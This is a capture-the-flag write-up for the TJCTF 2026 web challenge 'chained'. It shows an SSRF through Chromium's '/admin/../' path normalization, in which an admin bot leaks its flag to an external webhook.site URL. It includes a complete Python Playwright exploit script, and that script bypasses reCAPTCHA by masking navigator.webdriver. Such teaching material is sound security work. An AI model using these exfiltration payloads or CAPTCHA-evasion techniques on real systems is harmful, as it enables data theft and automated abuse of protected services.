# chained

**Author:** Jordan Lanham
**Event:** TJCTF 2026
**Category:** web
**Date:** May 15, 2026
**Read Time:** 6 minutes

---

## Overview

A Flask app and a Playwright "admin bot" chained together: the bot only navigates to URLs matching `^https://chained.tjc.tf/admin/`, and it appends the flag to the URL you submit. The Flask `/admin` endpoint is locked to `127.0.0.1`, but `/` blindly SSRFs whatever you put in the `url` GET param after a string blacklist. By submitting `https://chained.tjc.tf/admin/../?url=<webhook>`, **Chromium normalizes `/admin/../` away before sending the request**, so Flask never sees `..`, passes `isSafe()`, and then `requests.get()`'s our webhook with the flag in the URL.

## Challenge Description

> i designed my own admin bot! and i included an admin page that should be super duper secure...
> running on port 5000
> https://chained.tjc.tf | https://admin-bot.tjctf.org/chained

**Files provided:** `app.py`, `index.html`, `admin-bot.js`
**Endpoints:** `https://chained.tjc.tf` (Flask app) and `https://admin-bot.tjctf.org/chained` (admin-bot URL submission form, gated by reCAPTCHA v2 invisible)

## Initial Analysis

Three artifacts to read together:

**`app.py`** — two routes:
```python
def isSafe(url):
    blacklist={'127','local','2130706433','017700000001','::1','0.0.0.0',
               '[::]','ffff','0.0.0.0','0x','..','%2e%2e','@'}
    return all([i not in url.lower() for i in blacklist])

@app.route('/', methods=['GET','POST'])
def index():
    if POST: if not isSafe(url): denied; return redirect(url_for('index', url=url))
    url = args.get('url') or ''
    if url:
        try: req = 'Your response: ' + requests.get(url).text
        except: return 'Uh-oh...'
    ...

@app.route('/admin')
def js():
    if request.remote_addr != '127.0.0.1': return 'Access denied...'
    return request.args.get("q",""), 200, {'Content-Type':'application/javascript'}
```

The `/` route is a textbook SSRF behind a substring blacklist. `/admin` reflects the `q` param as JavaScript but is only reachable from `127.0.0.1`.

**`admin-bot.js`** — the headless bot:
```js
urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
handler: async (url, ctx) => {
    const page = await ctx.newPage();
    await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
    await sleep(5000);
}
```

Two crucial mechanics:
1. The bot validates the URL *with the regex* against the raw string you submit (must start with `/admin/`).
2. The bot then calls `page.goto(url + flag, ...)` — concatenating the flag onto your URL **as a string**, then handing it to Chromium, which will normalize the URL before issuing any HTTP request.

## Solution Approach

### Step 1: Reconnaissance

Fetched the live `https://chained.tjc.tf` — matches the source. Verified the SSRF primitive directly:

```
GET /?url=https://example.com/
-> renders Example Domain HTML inside the page (server-side requests.get)
```

`isSafe()` looks for substrings in the URL. The blacklist's job is to stop SSRF to `localhost`/`127.0.0.1` (so an attacker can't pivot to `/admin` and read the flag-as-JS reflection). But the flag is delivered by the *bot*, not by `/admin` reflection — so the relevant primitive is "make the bot hit a URL we control with the flag in it."

### Step 2: Vulnerability Identification

The flag concatenation is the weak link. The bot does:

```
page.goto( <attacker_url> + <flag> )
```

If we can make `<attacker_url>` syntactically match `/admin/...` (to pass `urlRegex`) but **semantically resolve to a different origin or a different path** after the browser normalizes it, we win.

The classic trick: `https://chained.tjc.tf/admin/../?url=<exfil>`. The regex `/^https:\/\/chained\.tjc\.tf\/admin\//` matches the raw string, but Chromium's URL parser collapses `/admin/..` -> `` before sending the request. The browser actually fetches:

```
https://chained.tjc.tf/?url=<exfil><flag>
```

That hits the Flask `/` route. `isSafe()` runs on `<exfil><flag>`. Our webhook URL contains none of `127`, `local`, `..`, `@`, etc. -- passes. Server runs `requests.get("<exfil><flag>")`. The webhook now has the flag in its access log.

### Step 3: Exploitation

Generated a webhook.site token via their API:

```
POST https://webhook.site/token  ->  uuid 6a7de3de-ca0e-4bcd-b44c-0fb170f9587b
```

Built the payload submitted to the admin bot:

```
https://chained.tjc.tf/admin/../?url=https://webhook.site/6a7de3de-ca0e-4bcd-b44c-0fb170f9587b?leak=
```

When the bot appends the flag and Chromium normalizes:

```
page.goto -> https://chained.tjc.tf/?url=https://webhook.site/<uuid>?leak=tjctf{...}
Flask    -> requests.get("https://webhook.site/<uuid>?leak=tjctf{...}")
```

The submission form on `admin-bot.tjctf.org/chained` is gated by Google reCAPTCHA v2 invisible. Rather than fight a CAPTCHA service, I drove the form with a headed Playwright Chromium with a real UA and `navigator.webdriver` masked — invisible v2 happily passes that fingerprint.

### Step 4: Flag Extraction

After submitting, polled `https://webhook.site/token/<uuid>/requests?sorting=newest`. Within ~10 seconds the most recent request URL was:

```
https://webhook.site/6a7de3de-ca0e-4bcd-b44c-0fb170f9587b?leak=tjctf%7Bch41n3d_o340e934l35d%7D
```

URL-decoded query string is the flag.

## Code / Exploit

```python
#!/usr/bin/env python3
"""TJCTF 2026 - chained: SSRF via path-traversal normalization in the admin bot."""
import time, json, re, urllib.request, urllib.parse
from playwright.sync_api import sync_playwright

WEBHOOK_UUID = "6a7de3de-ca0e-4bcd-b44c-0fb170f9587b"
WEBHOOK_URL  = f"https://webhook.site/{WEBHOOK_UUID}"
ADMIN_BOT    = "https://admin-bot.tjctf.org/chained"
PAYLOAD      = f"https://chained.tjc.tf/admin/../?url={WEBHOOK_URL}?leak="

def submit(payload):
    with sync_playwright() as p:
        b = p.chromium.launch(headless=False,
                              args=["--disable-blink-features=AutomationControlled"])
        ctx = b.new_context(
            user_agent=("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/126.0.0.0 Safari/537.36"),
            viewport={"width": 1280, "height": 800})
        page = ctx.new_page()
        page.add_init_script(
            "Object.defineProperty(navigator,'webdriver',{get:()=>undefined})")
        page.goto(ADMIN_BOT, wait_until="domcontentloaded")
        page.fill('input[name="url"]', payload)
        time.sleep(4)                       # let grecaptcha init
        page.click('button[type="submit"]') # invisible v2 fires here
        time.sleep(15)                      # bot visits our URL
        b.close()

def poll():
    api = f"https://webhook.site/token/{WEBHOOK_UUID}/requests?sorting=newest"
    for _ in range(30):
        d = json.loads(urllib.request.urlopen(api, timeout=10).read())
        for r in d.get("data", []):
            m = re.search(r"tjctf\{[^}]*\}", urllib.parse.unquote(r.get("url","")))
            if m: return m.group(0)
        time.sleep(3)

submit(PAYLOAD)
print("FLAG:", poll())
```

## Technical Details

- **Vulnerability class:** SSRF via URL-parser normalization differential (regex sees raw string, browser sees canonicalized URL) + insufficient substring blacklist.
- **Encryption / encoding:** none — pure URL semantics.
- **Protocol:** HTTPS; Chromium URL parsing per WHATWG URL Standard collapses `/segment/..` before issuing the network request.
- **Key trick:** `/admin/../` satisfies `^https://chained.tjc.tf/admin/` (raw regex) but Chromium normalizes it to `/` before hitting Flask, so the flag flows through Flask's SSRF sink instead of the locked-down `/admin` page.

## Key Insights

- Any time a security check runs against a raw URL string but a *different* component later parses that URL, look for a parser-differential bypass: `..`, `@`, `#`, mixed schemes, IDN, percent-encoding, etc.
- Substring blacklists for SSRF (`isSafe()` here) are nearly always bypassable. The real defense is allowlisting the destination host or doing DNS resolution + private-range checks before `requests.get`.
- Admin-bot challenges where the bot does `page.goto(user_url + flag)` are a recognizable pattern: get the bot to navigate to *your* URL while still satisfying the regex, and the flag arrives in your access log.
- reCAPTCHA v2 invisible isn't actually a wall against authorized red-team work — a headed real-Chromium session with a clean UA and `navigator.webdriver` masked passes the fingerprint check on first-party origins.

## The Flag

```
tjctf{ch41n3d_o340e934l35d}
```

## Resources

- [WHATWG URL Standard — Path normalization](https://url.spec.whatwg.org/#path-state)
- [PortSwigger — SSRF via URL parsing inconsistencies](https://portswigger.net/web-security/ssrf)
- [Orange Tsai — A New Era of SSRF (URL parser confusion)](https://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on-github-enterprise-together-and-took-home-12500x-bounty/)
